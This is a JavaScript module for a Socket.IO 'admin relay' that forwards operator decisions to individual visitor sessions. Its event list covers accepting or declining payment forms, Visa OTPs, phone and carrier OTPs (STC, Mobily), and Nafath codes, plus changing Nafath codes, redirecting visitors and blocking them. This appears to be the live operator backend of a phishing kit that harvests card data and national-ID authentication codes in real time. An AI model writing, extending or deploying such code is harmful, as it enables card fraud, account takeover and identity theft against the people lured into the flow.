// admin-relay.js
// Drop-in Socket.IO relay: forwards admin actions to the target client room.
//
// Usage (in your Socket.IO bootstrap, wherever `const io = new Server(...)` lives):
//
//   const { attachAdminRelay } = require("./admin-relay");
//   attachAdminRelay(io);
//
// or ESM:
//   import { attachAdminRelay } from "./admin-relay.js";
//   attachAdminRelay(io);
//
// Requires: socket.io v4+.

"use strict";

// Events that the admin dashboard emits. Each is forwarded verbatim to the
// customer socket in room `sessionId`.
const RELAY_EVENTS = [
  "acceptService",
  "declineService",
  "acceptPaymentForm",
  "declinePaymentForm",
  "acceptVisaOtp",
  "declineVisaOtp",
  "acceptPhone",
  "declinePhone",
  "acceptPhoneOTP",
  "declinePhoneOTP",
  "acceptMobOtp",
  "declineMobOtp",
  "acceptMotslOtp",
  "declineMotslOtp",
  "acceptStcPhoneOtp",
  "declineStcPhoneOtp",
  "acceptSTC",
  "declineSTC",
  "acceptNavaz",
  "declineNavaz",
  "changeNavazCode",   // extra: { code: "12" }
  "adminRedirect",     // extra: { path: "/verfiy" }
  "clientBlocked",
];

// Normalize the payload the admin dashboard sends.
// Accepts either a bare sessionId string, or { id, sessionId, ...extra }.
function normalizePayload(payload) {
  if (payload == null) return { id: null, extra: {} };
  if (typeof payload === "string") return { id: payload, extra: {} };
  if (typeof payload === "object") {
    const id = payload.id || payload.sessionId || payload.session || null;
    const extra = { ...payload };
    delete extra.id;
    delete extra.sessionId;
    delete extra.session;
    return { id, extra };
  }
  return { id: null, extra: {} };
}

// Resolve the session id the customer socket belongs to.
function resolveSessionId(socket, explicit) {
  if (explicit && typeof explicit === "string") return explicit;
  if (explicit && typeof explicit === "object") {
    const id = explicit.id || explicit.sessionId || explicit.session;
    if (id) return id;
  }
  const auth = socket.handshake && socket.handshake.auth;
  const query = socket.handshake && socket.handshake.query;
  return (
    (auth && (auth.id || auth.sessionId || auth.session)) ||
    (query && (query.id || query.sessionId || query.session)) ||
    null
  );
}

function attachAdminRelay(io) {
  if (!io || typeof io.on !== "function") {
    throw new Error("attachAdminRelay: expected a socket.io Server instance");
  }

  io.on("connection", (socket) => {
    // 1) Client joins its own room. Support several conventions.
    const autoId = resolveSessionId(socket, null);
    if (autoId) socket.join(autoId);

    for (const joinEvent of ["join", "register", "subscribe"]) {
      socket.on(joinEvent, (payload) => {
        const id = resolveSessionId(socket, payload);
        if (id) socket.join(id);
      });
    }

    // 2) Admin actions -> forward to the target session room.
    for (const event of RELAY_EVENTS) {
      socket.on(event, (payload, ack) => {
        const { id, extra } = normalizePayload(payload);
        if (!id) {
          if (typeof ack === "function") ack({ ok: false, error: "missing session id" });
          return;
        }

        // Never leak admin auth tokens to the customer socket.
        const clientExtra = { ...extra };
        delete clientExtra.token;
        delete clientExtra.adminToken;

        // Forward to every room the customer socket might be in.
        const hasExtra = Object.keys(clientExtra).length > 0;
        const targets = [id, `user:${id}`, `session:${id}`];
        for (const room of targets) {
          if (hasExtra) io.to(room).emit(event, clientExtra);
          else io.to(room).emit(event);
        }

        // Echo back to admins (dashboard listens here for confirmation).
        io.to("admins").emit(`admin:${event}`, { id, ...clientExtra });

        if (typeof ack === "function") ack({ ok: true, id, event });
      });
    }
  });
}


module.exports = { attachAdminRelay, RELAY_EVENTS };
module.exports.default = attachAdminRelay;
